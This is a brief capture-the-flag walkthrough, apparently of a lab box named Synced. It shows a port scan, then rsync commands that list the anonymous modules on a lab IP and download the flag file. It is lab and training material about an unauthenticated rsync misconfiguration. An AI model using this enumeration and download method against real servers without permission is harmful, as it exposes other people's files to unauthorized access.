Synced is a Very Easy Starting Point Linux box exposing rsync on port 873 with anonymous access. A `public` module contains the flag, downloadable in a single command.

## Reconnaissance

### Port Scan

```
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

## Exploitation

### Anonymous Rsync Access

```bash
# List available modules
rsync rsync://10.129.228.37/
# public         Anonymous Share

# Download the flag
rsync rsync://10.129.228.37/public/flag.txt .
```

No authentication required. The `public` module was world-readable.

## Key Takeaway

Rsync without authentication is a common misconfiguration. Always enumerate rsync modules when port 873 is open.
